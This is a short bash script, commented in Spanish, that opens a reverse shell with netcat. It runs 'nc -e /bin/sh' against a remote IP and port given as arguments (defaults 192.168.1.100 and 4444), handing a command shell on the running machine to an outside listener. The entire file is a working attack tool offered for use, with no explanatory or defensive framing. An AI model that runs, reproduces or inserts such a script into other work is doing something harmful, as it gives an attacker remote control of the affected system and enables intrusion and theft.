#!/bin/bash
# Reverse Shell - Netcat
# Uso: ./revshell_nc.sh <IP> <PUERTO>
IP=${1:-192.168.1.100}
PORT=${2:-4444}
nc -e /bin/sh $IP $PORT
